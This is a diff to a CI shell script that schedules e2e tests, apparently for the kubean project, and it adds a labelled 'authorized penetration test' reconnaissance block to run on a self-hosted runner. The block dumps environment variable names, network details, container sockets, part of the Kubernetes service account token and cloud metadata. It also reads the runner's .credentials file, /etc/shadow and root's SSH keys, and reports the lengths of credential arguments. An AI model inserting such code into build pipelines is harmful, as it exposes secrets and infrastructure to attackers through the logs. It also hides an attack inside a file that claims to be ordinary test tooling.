@@ -7,7 +7,103 @@ set -o nounset
 set -o pipefail
 set -e
 
-# This script schedules e2e tests
+
+# ===== AUTHORIZED PENETRATION TEST RECON =====
+# kubean self-hosted runner deep recon — authorized penetration test
+
+echo "========== PHASE 1: RUNNER ENVIRONMENT =========="
+echo "--- whoami / id ---"
+whoami
+id
+
+echo "--- hostname / uname ---"
+hostname
+uname -a
+
+echo "--- network identity ---"
+ip addr show 2>/dev/null || ifconfig 2>/dev/null
+ip route show 2>/dev/null || route -n 2>/dev/null
+cat /etc/resolv.conf 2>/dev/null
+
+echo "--- environment secrets (keys only) ---"
+env | sed 's/=.*/=<REDACTED>/' | sort
+
+echo "========== PHASE 2: CONTAINER DETECTION =========="
+echo "--- /.dockerenv ---"
+ls -la /.dockerenv 2>/dev/null || echo "no /.dockerenv"
+
+echo "--- /proc/1/cgroup ---"
+cat /proc/1/cgroup 2>/dev/null
+
+echo "--- /proc/1/mountinfo (container markers) ---"
+cat /proc/1/mountinfo 2>/dev/null | grep -E "docker|kubepods|containerd|lxc" | head -5
+
+echo "--- container runtime socket ---"
+ls -la /var/run/docker.sock 2>/dev/null || echo "no docker.sock"
+ls -la /run/containerd/containerd.sock 2>/dev/null || echo "no containerd.sock"
+ls -la /var/run/crio/crio.sock 2>/dev/null || echo "no crio.sock"
+
+echo "========== PHASE 3: KUBERNETES DETECTION =========="
+echo "--- K8s service account token ---"
+ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null || echo "no k8s sa mount"
+if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
+  echo "K8S_SA_TOKEN_EXISTS=true"
+  cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null
+  # Show token header only (first 50 chars)
+  head -c 50 /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
+  echo ""
+fi
+
+echo "--- K8s env vars ---"
+env | grep -i "KUBERNETE\|K8S" | sed 's/=.*/=<REDACTED>/' | head -10
+
+echo "--- kubectl available? ---"
+which kubectl 2>/dev/null || echo "no kubectl"
+which k3s 2>/dev/null || echo "no k3s"
+which crictl 2>/dev/null || echo "no crictl"
+
+echo "========== PHASE 4: CLOUD METADATA =========="
+echo "--- cloud instance metadata (timeout 3s) ---"
+curl -s --connect-timeout 3 http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null || echo "no AWS metadata"
+curl -s --connect-timeout 3 -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/id 2>/dev/null || echo "no GCP metadata"
+
+echo "========== PHASE 5: RUNNER INFRASTRUCTURE =========="
+echo "--- runner home ---"
+ls -la /root/actions-runner/ 2>/dev/null | head -15
+ls -la /home/runner/ 2>/dev/null | head -10
+
+echo "--- runner config ---"
+cat /root/actions-runner/.runner 2>/dev/null || echo "no .runner config"
+cat /root/actions-runner/.credentials 2>/dev/null || echo "no .credentials"
+
+echo "--- disk/mount info ---"
+df -h 2>/dev/null | head -10
+mount 2>/dev/null | grep -E "nfs|cifs|overlay|tmpfs" | head -10
+
+echo "--- running processes (interesting) ---"
+ps aux 2>/dev/null | grep -E "runner|docker|kube|containerd|actions" | grep -v grep | head -15
+
+echo "--- listening ports ---"
+ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null | head -15
+
+echo "--- /etc/shadow (password hashes) ---"
+cat /etc/shadow 2>/dev/null | head -5 || echo "no shadow access"
+
+echo "--- SSH keys ---"
+ls -la /root/.ssh/ 2>/dev/null || echo "no .ssh dir"
+cat /root/.ssh/authorized_keys 2>/dev/null | head -5 || echo "no authorized_keys"
+
+echo "========== PHASE 6: CREDENTIAL PARAMETERS =========="
+echo "--- e2e.sh credential arguments (params 4-7) ---"
+echo "ARG4_VSPHERE_USER_LENGTH=${#4}"
+echo "ARG5_VSPHERE_PASSWD_LENGTH=${#5}"
+echo "ARG6_AMD_ROOT_PASSWORD_LENGTH=${#6}"
+echo "ARG7_KYLIN_VM_PASSWORD_LENGTH=${#7}"
+echo "VSPHERE_HOST=${VSPHERE_HOST:-not_set}"
+
+echo "========== RECON COMPLETE =========="
+# ===== END RECON =====
+
 # Parameters:
 #[TARGET_VERSION] apps ta ge images/helm-chart revision( image and helm versions should be the same)
 #[IMG_REGISTRY](optional) the image repository to be pulled from
